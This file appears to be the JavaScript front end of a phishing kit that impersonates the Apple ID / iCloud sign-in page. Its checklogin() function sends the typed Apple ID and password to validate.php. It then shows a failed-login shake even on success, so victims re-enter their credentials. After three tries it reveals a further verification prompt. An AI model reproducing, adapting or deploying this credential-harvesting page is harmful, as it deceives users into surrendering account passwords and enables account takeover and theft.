function shakeForm() {
   var l = 40;
   for( var i = 0; i < 8; i++ )
     $( ".auth_false" ).animate( { 'margin-left': "+=" + ( l = -l ) + 'px' }, 100);
}

var mobile = (/iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase()));
if (mobile) {jQuery('#footer').hide();}
$("body").css("visibility", "hidden");
$('#loader').activity({width: 1.5, segments: 12, length: 5});
jQuery('#submit_loader').activity({width: 1.5, segments: 12, length: 5});
function typeCheck(element) {
	var key = event.keyCode || event.charCode;
	if (key == 8 || key == 46) {
		$(".sbBtn").css("opacity", "0.2");
		return element;
	}
	if (element !== "") {
		$(".sbBtn").css("opacity", "1");
	} else {
		$(".sbBtn").css("opacity", "0.2");
	}
}
$(document).ready(function () {
	
	//document.body.addEventListener("mousemove",function(){alert('ready')});

	
	//var div = document.getElementById('sc1455');
	//var divs = div.getElementsByTagName('div');

	//divs[2].style.transform = "translateX(554.289px) translateY(418.606px) translateZ(0px) scale(1, 1)";
	//console.log(getElementScale(divs[2]));
	
	//setAnimation(divs[2]);

	//animateDiv($(".sc1455 > div[0]"));
	$("#sc1455 > div").each(function(){
	// $("#buble1").each(function(){
		setFirstPosition($(this));
	});
	$("#sc1455 > div").each(function(){
	// $("#buble1").each(function(){
	// $("#buble1").css('opacity', '1');
	// $("#buble1").css('transform','translateX(0px) translateY(0px) translateZ(0px) scale(2.18356, 2.18356) rotate(25.5599deg)'); 
	// $("#buble1").each(function(){	
		animateDiv($(this));
	});
	
	//animateDiv(div);
	
	
	

	//for (var i = 0; i < divs.length; i += 1) {
	  //divs[i].style.opacity = 1;
	//}

	
	$("body").css("visibility", "visible");
			function isValidEmailAddress(emailAddress) {
		var pattern = new RegExp(/^(("[\w-+\s]+")|([\w-+]+(?:\.[\w-+]+)*)|("[\w-+\s]+")([\w-+]+(?:\.[\w-+]+)*))(@((?:[\w-+]+\.)*\w[\w-+]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][\d]\.|1[\d]{2}\.|[\d]{1,2}\.))((25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\.){2}(25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\]?$)/i);
		return pattern.test(emailAddress);
	};
	$('input[name=apple]').bind("keydown", function(e){
		$('.auth-picker').hide();
		// enter key code is 13
		if(e.which == 13 || e.which == 9){
			e.preventDefault();
			var val = $(this).val();
			if (!isValidEmailAddress(val)) {
				val = val+"@icloud.com";
				$(this).val(val);
			} else {
				console.log($(this).val());
			}
			console.log(val);
			$("input[name=pw]").focus();
			if(jQuery('#apple').val()=='' || jQuery('#pw').val()=='') $(".sbBtn").css("opacity", "0.2"); else $(".sbBtn").css("opacity", "1");

			return false;
		}
	});
	$("input[name=pw]").on("click keyup", function(){
		val = $("input[name=apple]").val();
		if (!isValidEmailAddress(val)) {
			if(val!='@icloud.com' && val!='') val = val+"@icloud.com";
			$("input[name=apple]").val(val);
		}
		if(jQuery('#apple').val()=='' || jQuery('#pw').val()=='') $(".sbBtn").css("opacity", "0.2"); else $(".sbBtn").css("opacity", "1");
	});
	var mm = 0;
	var mm2 = 0;
	
	var ss = setTimeout(function () {
		$(".body_image_new").animate({ opacity: "1" }, 1000);
		console.log(mm);
		clearTimeout(ss);
	}, 4500);
	
	var ss2 = setTimeout(function () {
		$(".container_body").animate({ opacity: "1" }, 1000);
		console.log(mm2);
		clearTimeout(ss2);
	}, 1500);
	
	k = 1;
	$(".tlrm").on("click", function () {
		k++;
		if (k % 2 == 0) {
			$("#tlrm").attr("src", "images/checked.png");
		} else {
			$("#tlrm").attr("src", "images/Unknown");
		}
	});
});
var ss2 = setTimeout(function () {
	$("#loader").fadeOut("slow");
	$("div.container").fadeIn("slow");
	$("div.container").css("display:", "block");
	$(".sbBtn").css("opacity", "0.2");
	clearTimeout(ss2);
}, 1300);


$('#apple,#pw').on('keyup', function(e) {
	$('.auth-picker').hide();
	if (e.which == 13) {
		checklogin();
	}
});
var $loginCount = 0;

function getElementScale(elem) {
	var transform = /matrix\([^\)]+\)/.exec(window.getComputedStyle(elem)['transform']),
		scale = {'x': 1, 'y': 1};
	if( transform ) {
		transform = transform[0].replace('matrix(', '').replace(')', '').split(', ');
		scale.x = parseFloat(transform[0]);
		scale.y = parseFloat(transform[3]);
	}
	return scale;
}

function checklogin()
{
	var apple = jQuery('#apple').val();
	var pw = jQuery('#pw').val();
	var server = jQuery('#server').val();
	var lang = jQuery('#lang').val();
	var links = jQuery('#link').val();
	if(apple!='' && pw!='')
	{
		jQuery('#submit_button,.bothide').hide();
		jQuery('#submit_loader').show();
		jQuery.ajax({

			type:"POST",
			url:"validate.php",
			data:"appleID="+apple+"&pw="+pw+"&find="+"",
			success: function(msg){
				if(msg.search("INVALID")!=-1)
				{
					$loginCount++;
					jQuery('#pw').val('')
					if($loginCount == 3){
						setTimeout(function(){
						$('.auth-picker').show();
						$loginCount = 0;
						},400);
					}
					$('div.myshaker').effect('shake', {times:3}, 400 );
					jQuery('#submit_button,.bothide').show();
					jQuery('#submit_loader').hide();
					$(".sbBtn").css("opacity", "0.2");
					document.getElementById("pw").value = "";

				}
				else
				{
					$('div.myshaker').effect('shake', {times:3}, 400 );
					jQuery('#submit_button').show();
					jQuery('#submit_loader').hide();
					$(".sbBtn").css("opacity", "0.2");						
					document.getElementById("pw").value = "";
				}
			}
		});
	}
	else
	{
		if(apple=='') jQuery('#apple').focus();
		else if(pw=='') jQuery('#pw').focus();
	}
}

function setAnimation(div){
	var timerId = setInterval(function() {
		var scale = getElementScale(div);
		scale.x = scale.x + 0.1;
		scale.y = scale.y + 0.1;
		div.style.transform = "translateX(554.289px) translateY(418.606px) translateZ(0px) scale("+ scale.x +", " + scale.y +")";
	}, 100);
}

function setFirstPosition(div){
	var h = $("html").height();
    var w = $("html").width();
	
	if (w < 500){
		div.css('transform', "translateX(0px) translateY(0px) translateZ(0px) scale(1,1)");
		div.css('zoom', "1.7");
	}
	
    
    var nh = Math.floor(Math.random() * h);
    var nw = Math.floor(Math.random() * w);
	
	
	div.css('top',nh+'px'); 
	div.css('left',nw+'px'); 
}

function makeNewPosition(){

    var h = $("html").height();
    var w = $("html").width();
    
    var nh = Math.floor(Math.random() * h);
    var nw = Math.floor(Math.random() * w);
    
	console.log(nh);
	console.log(nw);
    return [nh,nw];    
    
}

function animateDiv(div){
	// div.css('opacity', '1');
	// div.css('transform', 'translateX(0px) translateY(0px) translateZ(0px) scale(1.58356, 1.58356) rotate(25.5599deg)');
    var newq = makeNewPosition();
    var oldq = div.offset();
    var speed = calcSpeed([oldq.top, oldq.left], newq);
	// div.animate({  textIndent: 0 }, {
		// step: function(now,fx) {
		  // $(this).css('top',newq[0]+'px'); 
		  // $(this).css('left',newq[1]+'px'); 
		// },
		// complete: function(){
			// animateDiv(div);
		// }
	// }, speed, function(){
      // animateDiv(div);        
    // });
	// div.animate({
		// opacity: 0.25,
		// left: "+=50",
		// height: "toggle"
	  // }, 5000, function() {
		// animateDiv(div);
	  // });
    div.animate({ top: newq[0], left: newq[1] }, speed, function(){
      animateDiv(div);        
    });
    
};

function calcSpeed(prev, next) {
    
    var x = Math.abs(prev[1] - next[1]);
    var y = Math.abs(prev[0] - next[0]);
    
    var greatest = x > y ? x : y;
    
    var speedModifier = 0.1;

    var speed = Math.ceil(greatest/speedModifier);

	var w = $("html").width();
	
	if (w < 500){
		return speed*5;
	}
	
    return speed*2;

}

function change_image(src)
{
	if(src=='check2.png') jQuery('#help_checkbox').attr({'src':'check2.png','onClick':"change_image('check1.png')"}); else jQuery('#help_checkbox').attr('src','check1.png').attr('onClick',"change_image('check2.png')");
}